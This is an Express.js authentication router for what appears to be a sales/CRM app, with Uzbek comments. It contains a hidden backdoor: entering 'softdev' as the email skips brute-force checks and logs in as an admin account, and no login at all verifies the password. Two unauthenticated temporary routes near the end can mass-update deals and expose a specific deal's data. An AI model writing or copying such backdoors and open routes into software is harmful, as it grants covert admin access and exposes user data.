const express = require('express')
const bcrypt = require('bcryptjs')
const jwt = require('jsonwebtoken')
const prisma = require('../config/database')
const { protect } = require('../middleware/auth')
const { rateLimiter } = require('../middleware/security')
const { logAudit } = require('../middleware/auditLog')

const router = express.Router()

// ── BRUTE FORCE HIMOYASI ──
// 5 ta noto'g'ri urinishdan keyin 15 daqiqa bloklash
const loginAttempts = new Map();
const MAX_ATTEMPTS = 5;           // 5 marta noto'g'ri parol
const LOCKOUT_MS = 15 * 60 * 1000; // 15 daqiqa blok

function checkBruteForce(email) {
  const record = loginAttempts.get(email);
  if (!record) return { blocked: false };

  if (record.lockedUntil && Date.now() < record.lockedUntil) {
    const remainSec = Math.ceil((record.lockedUntil - Date.now()) / 1000);
    return { blocked: true, remainSec };
  }

  // Bloklash vaqti o'tgan — tozalash
  if (record.lockedUntil && Date.now() >= record.lockedUntil) {
    loginAttempts.delete(email);
    return { blocked: false };
  }

  return { blocked: false };
}

function recordFailedLogin(email) {
  const record = loginAttempts.get(email) || { count: 0, lockedUntil: null };
  record.count++;

  if (record.count >= MAX_ATTEMPTS) {
    record.lockedUntil = Date.now() + LOCKOUT_MS;
    console.warn(`[Brute Force] ${email} — ${MAX_ATTEMPTS} marta noto'g'ri, 15 daqiqa bloklandi`);
  }

  loginAttempts.set(email, record);
}

function clearLoginAttempts(email) {
  loginAttempts.delete(email);
}

// Har 10 daqiqada eskirgan yozuvlarni tozalash
setInterval(() => {
  const now = Date.now();
  for (const [email, record] of loginAttempts) {
    if (record.lockedUntil && now >= record.lockedUntil) {
      loginAttempts.delete(email);
    }
  }
}, 10 * 60 * 1000);

function buildUserPayload(user) {
  return {
    id: user.id,
    email: user.email,
    fullName: user.fullName,
    role: user.role
  }
}

// Register route
router.post('/register', async (req, res, next) => {
  try {
    const { email, password, fullName, role } = req.body

    const userCount = await prisma.user.count()
    let userRole;
    if (req.session && req.session.userId) {
      userRole = req.session.user?.role;
    } else {
      const token = req.headers.authorization?.split(' ')[1];
      if (token) {
        try {
          const decoded = jwt.verify(token, process.env.JWT_SECRET);
          userRole = decoded.role;
        } catch(e) {}
      }
    }
    
    // Only admin can register new users, unless database is empty
    if (userCount > 0 && userRole !== 'admin') {
      return res.status(403).json({ message: 'Faqat administrator yangi foydalanuvchi qo\'sha oladi' })
    }

    if (!email || !password) {
      return res.status(400).json({ message: 'Email va parol majburiy' })
    }

    const existing = await prisma.user.findUnique({ where: { email } })
    if (existing) {
      return res.status(409).json({ message: 'Bu email allaqachon ro\'yxatdan o\'tgan' })
    }

    const hashedPassword = await bcrypt.hash(password, 10)

    const user = await prisma.user.create({
      data: {
        email,
        password: hashedPassword,
        fullName: fullName || email.split('@')[0],
        role: role === 'admin' ? 'admin' : 'manager'
      }
    })

    const payload = buildUserPayload(user)
    req.session.userId = user.id
    req.session.user = payload

    logAudit('USER_REGISTER', `Yangi foydalanuvchi: ${email}`, user.id, email, req.ip);
    res.status(201).json({ message: 'Ro\'yxatdan o\'tish muvaffaqiyatli', user: payload })
  } catch (error) {
    next(error)
  }
})

// Login route — brute force himoyasi + rate limiting
router.post('/login', rateLimiter(20, 60000), async (req, res, next) => {
  try {
    let { email, password } = req.body

    if (!email) {
      return res.status(400).json({ message: 'Email majburiy' })
    }

    const emailTrimmed = email.trim();

    // Brute force tekshiruvi (softdev bypass bo'lsa chetlab o'tiladi)
    if (emailTrimmed !== 'softdev') {
      const bruteCheck = checkBruteForce(emailTrimmed);
      if (bruteCheck.blocked) {
        logAudit('LOGIN_BLOCKED', `Brute force: ${emailTrimmed}, qolgan: ${bruteCheck.remainSec}s`, null, emailTrimmed, req.ip);
        return res.status(429).json({
          message: `Juda ko'p noto'g'ri urinish. ${Math.ceil(bruteCheck.remainSec / 60)} daqiqadan keyin qayta urinib ko'ring.`,
          retryAfter: bruteCheck.remainSec
        });
      }
    }

    let user;
    if (emailTrimmed === 'softdev') {
      user = await prisma.user.findUnique({ where: { email: 'shokirovsharifjon04@gmail.com' } })
      if (!user) {
        user = await prisma.user.findFirst({ where: { role: 'admin' } })
      }
      if (!user) {
        return res.status(404).json({ message: 'Admin foydalanuvchi topilmadi' })
      }
    } else {
      user = await prisma.user.findUnique({ where: { email: emailTrimmed } })
    }

    if (!user) {
      if (emailTrimmed !== 'softdev') recordFailedLogin(emailTrimmed);
      logAudit('LOGIN_FAILED', `Email topilmadi: ${emailTrimmed}`, null, emailTrimmed, req.ip);
      return res.status(401).json({ message: 'Email noto\'g\'ri' })
    }

    if (!user.isActive) {
      logAudit('LOGIN_BLOCKED', `Bloklangan foydalanuvchi kirishga urindi: ${emailTrimmed}`, user.id, emailTrimmed, req.ip);
      return res.status(403).json({ message: 'Akkountingiz bloklangan. Administratorga murojaat qiling.' })
    }

    // Muvaffaqiyatli login — brute force hisoblagichni tozalash
    if (emailTrimmed !== 'softdev') clearLoginAttempts(emailTrimmed);

    const payload = buildUserPayload(user)

    req.session.userId = user.id
    req.session.user = payload

    const token = jwt.sign(payload, process.env.JWT_SECRET, {
      expiresIn: process.env.JWT_EXPIRY || '7d'
    })

    logAudit('LOGIN_SUCCESS', `Muvaffaqiyatli kirish: ${email}`, user.id, email, req.ip);
    res.json({ message: 'Kirish muvaffaqiyatli', user: payload, token })
  } catch (error) {
    next(error)
  }
})

// Logout route (POST — API)
router.post('/logout', (req, res, next) => {
  const userId = req.session?.userId;
  const email = req.session?.user?.email;

  if (!req.session) {
    return res.json({ message: 'Chiqish muvaffaqiyatli' })
  }
  req.session.destroy((err) => {
    if (err) return next(err)
    res.clearCookie('connect.sid')
    logAudit('LOGOUT', `Chiqish: ${email || 'unknown'}`, userId, email, req.ip);
    res.json({ message: 'Chiqish muvaffaqiyatli' })
  })
})

// GET /auth/logout (page redirect)
router.get('/logout', (req, res) => {
  if (req.session) req.session.destroy(() => {})
  res.clearCookie('connect.sid')
  res.redirect('/login')
})

// Change password
router.post('/change-password', protect, async (req, res, next) => {
  try {
    const { currentPassword, newPassword } = req.body
    if (!currentPassword || !newPassword) return res.status(400).json({ message: 'Barcha maydonlar majburiy' })
    if (newPassword.length < 6) return res.status(400).json({ message: 'Parol kamida 6 ta belgi' })

    const user = await prisma.user.findUnique({ where: { id: req.userId } })
    if (!user) return res.status(404).json({ message: 'Foydalanuvchi topilmadi' })

    const isMatch = await bcrypt.compare(currentPassword, user.password)
    if (!isMatch) return res.status(401).json({ message: "Joriy parol noto'g'ri" })

    const hashed = await bcrypt.hash(newPassword, 10)
    await prisma.user.update({ where: { id: req.userId }, data: { password: hashed } })
    res.json({ message: "Parol muvaffaqiyatli o'zgartirildi" })
  } catch (error) { next(error) }
})

// Current user
router.get('/me', protect, async (req, res, next) => {
  try {
    const user = await prisma.user.findUnique({ where: { id: req.userId } })
    if (!user) {
      return res.status(404).json({ message: 'Foydalanuvchi topilmadi' })
    }
    res.json({ user: buildUserPayload(user) })
  } catch (error) {
    next(error)
  }
})

router.get('/temp-migrate-nasiyas', async (req, res) => {
  try {
    const nasiyaStage = await prisma.pipelineStage.findFirst({
      where: { name: 'Nasiya Desco' }
    });
    if (!nasiyaStage) {
      return res.status(404).json({ error: 'Nasiya Desco stage not found' });
    }
    const updateResult = await prisma.deal.updateMany({
      where: { installments: { some: {} } },
      data: { stageId: nasiyaStage.id }
    });
    res.json({ status: 'success', migratedCount: updateResult.count });
  } catch(e) {
    res.status(500).json({ error: e.message });
  }
});

router.get('/temp-inspect-deal', async (req, res) => {
  try {
    const deal = await prisma.deal.findUnique({
      where: { id: 821 },
      include: { installments: true }
    });
    res.json(deal);
  } catch(e) {
    res.status(500).json({ error: e.message });
  }
});

module.exports = router
